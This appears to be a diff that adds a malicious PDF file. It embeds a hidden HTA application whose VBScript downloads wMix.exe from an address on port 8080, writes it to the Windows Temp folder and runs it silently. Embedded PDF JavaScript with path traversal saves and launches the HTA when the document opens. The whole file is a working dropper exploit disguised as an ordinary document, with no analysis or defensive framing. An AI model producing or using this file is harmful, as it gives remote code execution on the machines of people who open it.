@@ -1,0 +1,90 @@
+%PDF-1.7
+4 0 obj
+<<
+/Length 0
+>>
+stream
+<head><hta:application
+applicationname="wMix"
+border="none"
+borderstyle="normal"
+caption="false"
+contextmenu="false"
+icon="%SystemRoot%/Installer/{7E1360F1-8915-419A-B939-900B26F057F0}/Professional.ico"
+maximizebutton="false"
+minimizebutton="false"
+navigable="false"
+scroll="false"
+selection="false"
+showintaskbar="No"
+sysmenu="false"
+version="1.0"
+windowstate="Minimize"></head>
+<style>* { visibility: hidden; }</style>
+<script language="VBScript">
+window.resizeTo 1,1
+window.moveTo -2000,-2000
+</script>
+<script type="text/javascript">setTimeout("window.close()", 5000);</script>
+<script language="VBScript">
+On Error Resume Next
+Set CF = CreateObject("Microsoft.XMLHTTP")
+CF.open "GET","http://192.168.178.22:8080/wMix.exe",False
+CF.send
+Set bT = CreateObject("ADODB.Stream")
+bT.Open
+bT.Type=1
+bT.Write CF.responseBody
+bT.SaveToFile "C:/Windows/Temp/wMix.exe",2
+set shellobj = CreateObject("wscript.shell")
+shellobj.Run "C:/Windows/Temp/wMix.exe",0
+</script>
+endstream endobj
+5 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/Contents 4 0 R
+>>
+endobj
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction [ 5 0 R /Fit ]
+  /Names <<
+/JavaScript <<
+  /Names [ (EmbeddedJS)
+<<
+  /S /JavaScript
+  /JS (
+this.saveAs('../../../../../../../../../../../../../../../../Windows/Temp/wMix.hta');
+app.launchURL('c$:/../../../../../../../../../../../../../../../../Windows/Temp/wMix.hta');
+  )
+>>
+  ]
+>>
+  >>
+>>
+endobj
+2 0 obj
+<</Type/Pages/Count 1/Kids [ 5 0 R ]>>
+endobj
+3 0 obj
+<<>>
+endobj
+xref
+0 6
+0000000000 65535 f
+0000000166 00000 n
+0000000244 00000 n
+0000000305 00000 n
+0000000009 00000 n
+0000000058 00000 n
+trailer <<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+327
+%%EOF
